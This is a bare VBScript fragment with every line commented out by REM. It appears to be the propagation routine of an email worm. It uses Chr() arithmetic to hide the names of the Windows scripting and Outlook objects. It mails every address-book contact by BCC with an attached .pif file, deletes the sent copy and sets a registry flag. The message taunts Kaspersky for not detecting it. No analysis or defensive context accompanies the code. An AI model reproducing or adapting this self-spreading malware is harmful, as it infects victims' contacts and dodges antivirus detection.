REM On Error Resume Next
REM Dim UNO
REM Dim DOS
REM Dim TRES
REM Dim CUATRO
REM Dim CINCO
REM Dim SEIS
REM Dim Xb
REM Dim Xc
REM Dim Xd
REM Er = 59
REM Gr = 20
REM one = 60
REM Cr  = 100
REM Ypt = 91
REM Set Xc = CreateObject( Chr(Cr-13)+Chr(Cr-17)+"cript"+Chr(gr+26)+Chr(Cr-17)+"hell" )
REM Xb = Xc.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "OFF" )
REM If Xb <> 0 Then
REM Set TRES = CreateObject( Chr(20+Er)+"utl"+Chr((Er+Gr+one)-28 )+Chr((Er+Gr)+32 )+"k"+Chr(gr+26)+Chr(one+5)+Chr((Er+Gr+one)-27 )+"plic"+"ati"+Chr((Er+Gr+one)-28 )+"n" )
REM Set UNO = TRES.GetNameSpace( chr(Cr-23)+Chr(Ypt-26)+chr(Cr-20) +Chr(Ypt-18))
REM For Each DOS In UNO.AddressLists
REM Set SEIS = TRES.CreateItem( 0 )
REM For CUATRO = 1 To DOS.AddressEntries.Count
REM Set CINCO = DOS.AddressEntries( CUATRO )
REM If CUATRO = 1 Then
REM SEIS.BCC = CINCO.Address
REM Else
REM SEIS.BCC = SEIS.BCC & "; " & CINCO.Address
REM End If
REM Next
REM SEIS.Subject = "El demo de Kaspersky no me detecta...!!!."
REM SEIS.Body = "jejejejeje....al parecer el DeMo de Kaspersky Antivirus no me conoce...!!!."
REM SEIS.Attachmets.Add "C:\WINDOWS\EnLosAndes.pif"
REM SEIS.DeleteAfterSubmit = True
REM SEIS.Send
REM Xc.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "OFF","0"
REM Next
REM End If
